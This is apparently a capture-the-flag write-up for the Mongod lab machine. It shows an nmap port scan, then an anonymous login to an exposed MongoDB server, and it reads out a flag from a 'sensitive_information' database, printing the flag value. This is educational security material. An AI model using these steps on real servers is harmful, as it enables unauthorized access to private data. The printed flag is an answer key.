# Writeup Mongod

#MongoDB
#Databases
#Reconnaissance
#Misconfiguration
#Anonymous/Guest Access

## Introduction

Databases are organized collections of information that are easily accessible, manageable, and updatable, playing a crucial role in environments by handling sales transactions, product inventory, customer profiles, and marketing activities. MongoDB is a document-oriented NoSQL database where data is organized into databases, collections, and documents, with documents storing data in a JSON-like format. Misconfigurations in database servers, such as allowing anonymous logins, can lead to unauthorized access to sensitive information. For example, the Mongod Linux box runs a MongoDB server that permits anonymous login, enabling remote connection and database enumeration using the mongo command line utility to retrieve data.

**MongoDB** is a document-oriented database. In other words, you get the scalability and flexibility you want, with the query and indexing functions you need.

## Enumeration

- `nmap -p- --min-rate=1000 -sV {TARGET_IP}`
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-01 05:26 EDT
Warning: 10.129.44.89 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.44.89
Host is up (0.098s latency).
Not shown: 65253 closed tcp ports (reset), 280 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
27017/tcp open  mongodb MongoDB 3.6.8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.55 seconds
```

-p- : This flag scans for all TCP ports ranging from 0-65535

-sV : Attempts to determine the version of the service running on a port

--min-rate : This is used to specify the minimum number of packets that Nmap should
send per second; it speeds up the scan as the number goes higher

- `mongo --host {TARGET_IP}:{PORT}`

```
> show dbs
admin                  0.000GB
config                 0.000GB
local                  0.000GB
sensitive_information  0.000GB
users                  0.000GB
> use sensitive_information
switched to db sensitive_information
> show collections
flag
> db.flag.find().pretty()
{
        "_id" : ObjectId("630e3dbcb82540ebbd1748c5"),
        "flag" : "1b6e6fb359e7c40241b6d431427ba6ea"
}
```

- `db.flag.find().pretty()` display all documents

flag: 1b6e6fb359e7c40241b6d431427ba6ea